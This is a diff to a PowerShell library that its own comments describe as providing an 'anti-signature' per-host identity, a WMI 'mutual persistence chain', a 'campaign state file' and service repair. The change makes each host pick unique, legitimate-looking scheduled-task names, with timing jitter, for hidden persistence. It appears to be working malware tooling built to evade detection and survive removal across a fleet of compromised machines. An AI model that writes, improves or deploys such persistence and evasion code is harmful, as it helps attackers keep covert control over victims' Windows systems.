@@ -1,6 +1,6 @@
 #Requires -Version 5.1
 # ═══════════════════════════════════════════════════════════════
-# OWN_LIB  BUILD 20260802L3
+# OWN_LIB  BUILD 20260802L4
 # Shared library: per-host identity (anti-signature), WMI watchdog
 # (mutual persistence chain), campaign state file, SC service repair.
 # L2: safe task-name pools (parents exist on all Win10/11), IDENTVER
@@ -24,7 +24,7 @@ param(
 
 $ErrorActionPreference = 'SilentlyContinue'
 $cfgPath = Join-Path $WorkDir 'identity.cfg'
-$IdentVersion = 2
+$IdentVersion = 3
 
 # Legit-looking task-name pools; per-host hash picks one per slot.
 # v2: ONLY parent folders that exist on every Win10/11 (WwanSvc/MemoryDiagnostic/
@@ -74,11 +74,22 @@ function Initialize-Identity {
         Remove-Item -LiteralPath $cfgPath -Force
     }
     $s = Get-HostSeed
+    # L4: two slots may hash to the same task path (pools share names) ->
+    # one physical task then satisfies two slots and the fleet shows 3/4.
+    # Walk each pool forward until the pick is unique across slots.
+    $pick = [ordered]@{}
+    foreach ($slot in @(@('A', $s % 8), @('B', ($s + 3) % 8), @('C', ($s + 5) % 8), @('D', ($s + 7) % 8))) {
+        $letter = [string]$slot[0]; $i = [int]$slot[1]
+        $name = $Pools[$letter][$i]
+        $n = 0
+        while ($pick.Values -contains $name -and $n -lt 8) { $i = ($i + 1) % 8; $name = $Pools[$letter][$i]; $n++ }
+        $pick[$letter] = $name
+    }
     $cfg = @(
-        "TASK_A=$($Pools.A[$s % 8])"
-        "TASK_B=$($Pools.B[($s + 3) % 8])"
-        "TASK_C=$($Pools.C[($s + 5) % 8])"
-        "TASK_D=$($Pools.D[($s + 7) % 8])"
+        "TASK_A=$($pick.A)"
+        "TASK_B=$($pick.B)"
+        "TASK_C=$($pick.C)"
+        "TASK_D=$($pick.D)"
         "MO_A=$(2 + ($s % 4))"          # 2-5 min jitter
         "MO_B=$(3 + (($s + 1) % 3))"    # 3-5 min jitter
         "SEED=$s"
